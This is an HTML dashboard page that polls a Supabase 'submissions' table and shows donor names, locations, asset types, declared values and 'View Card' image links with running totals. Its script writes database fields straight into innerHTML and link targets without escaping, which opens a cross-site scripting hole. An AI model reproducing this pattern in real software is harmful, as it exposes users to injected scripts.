<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asset Control Center | Live Feed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;900&display=swap" rel="stylesheet">
    <style>
        body { background-color: #050505; color: white; font-family: 'Montserrat', sans-serif; }
        .glass-card { background: rgba(15, 15, 15, 0.9); border: 1px solid #222; }
        .gold-glow { border-color: #C9A45C; box-shadow: 0 0 15px rgba(201,164,92,0.1); }
    </style>
</head>
<body class="p-4 md:p-10">

    <header class="max-w-6xl mx-auto flex justify-between items-center mb-8 border-b border-zinc-800 pb-6">
        <div>
            <h1 class="text-[#C9A45C] text-[9px] font-black uppercase tracking-[0.5em]">Sovereign Intelligence</h1>
            <h2 class="text-xl font-black uppercase italic">Control Center</h2>
        </div>
        <div id="status-tag" class="bg-green-500/10 text-green-500 text-[10px] font-bold px-4 py-2 rounded-full border border-green-500/20">SYSTEM LIVE</div>
    </header>

    <main class="max-w-6xl mx-auto space-y-6">
        <!-- GLOBAL STATS -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div class="glass-card p-6 rounded-3xl">
                <p class="text-[8px] text-zinc-500 font-black uppercase mb-1">Incoming Assets</p>
                <p id="total-count" class="text-3xl font-black italic">0</p>
            </div>
            <div class="glass-card p-6 rounded-3xl border-l-4 border-l-[#C9A45C]">
                <p class="text-[8px] text-zinc-500 font-black uppercase mb-1">Gross Intake</p>
                <p id="total-val" class="text-2xl font-black gold-text italic">0.00</p>
            </div>
            <div class="glass-card p-6 rounded-3xl">
                <p class="text-[8px] text-zinc-500 font-black uppercase mb-1">Active Hubs</p>
                <p id="hub-count" class="text-3xl font-black italic">0</p>
            </div>
            <div class="glass-card p-6 rounded-3xl">
                <p class="text-[8px] text-zinc-500 font-black uppercase mb-1">Last Update</p>
                <p id="last-time" class="text-xs font-bold text-zinc-400 mt-3">--:--</p>
            </div>
        </div>

        <!-- LIVE TABLE -->
        <div class="glass-card rounded-[2.5rem] overflow-hidden">
            <div class="p-6 bg-zinc-900/30 flex justify-between items-center">
                <p class="text-[10px] font-black uppercase tracking-widest text-[#C9A45C]">Live Data Stream</p>
                <span class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></span>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full text-left">
                    <thead class="text-[8px] text-zinc-600 uppercase font-black border-b border-zinc-800 bg-black">
                        <tr>
                            <th class="p-5">ID</th>
                            <th class="p-5">Donor / Source</th>
                            <th class="p-5">Asset</th>
                            <th class="p-5">Value</th>
                            <th class="p-5 text-right">Verification</th>
                        </tr>
                    </thead>
                    <tbody id="live-body" class="divide-y divide-zinc-900">
                        <!-- DATA INJECTED HERE -->
                    </tbody>
                </table>
            </div>
        </div>
    </main>

    <script>
        const SUPABASE_URL = 'https://tekuwfiwqldsbmuofvnb.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_aAtBWENHDU7dAgkFq9UZUQ_HwqaFz4c'; 
        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        async function refreshFeed() {
            try {
                const { data, error } = await _supabase.from('submissions').select('*').order('created_at', { ascending: false });
                if (error) throw error;

                const feed = document.getElementById('live-body');
                feed.innerHTML = '';
                
                let grossValue = 0;
                let hubs = new Set();

                data.forEach(item => {
                    hubs.add(item.location);
                    // Parsing mixed currency like "500 AED"
                    const valNum = parseFloat(item.declared_value.split(' ')[0]) || 0;
                    grossValue += valNum;

                    feed.innerHTML += `
                        <tr class="hover:bg-zinc-800/20 transition-all">
                            <td class="p-5 font-mono text-[9px] font-bold text-[#C9A45C]">#${item.id}</td>
                            <td class="p-5">
                                <p class="text-xs font-bold text-white uppercase tracking-tight">${item.donor_name}</p>
                                <p class="text-[8px] text-zinc-600 font-bold uppercase">${item.location}</p>
                            </td>
                            <td class="p-5 text-[10px] font-black uppercase text-zinc-400">${item.asset_type}</td>
                            <td class="p-5">
                                <span class="text-lg font-black italic text-white">${item.declared_value}</span>
                            </td>
                            <td class="p-5 text-right">
                                <a href="${item.image_url}" target="_blank" class="inline-block bg-white text-black px-5 py-2 rounded-xl text-[9px] font-black uppercase hover:bg-[#C9A45C] transition-colors">View Card</a>
                            </td>
                        </tr>
                    `;
                });

                document.getElementById('total-count').innerText = data.length;
                document.getElementById('total-val').innerText = grossValue.toLocaleString();
                document.getElementById('hub-count').innerText = hubs.size;
                document.getElementById('last-time').innerText = new Date().toLocaleTimeString();

            } catch (err) {
                console.error("Live Feed Error", err);
            }
        }

        refreshFeed();
        setInterval(refreshFeed, 10000); // 10s auto-sync
    </script>
</body>
</html>
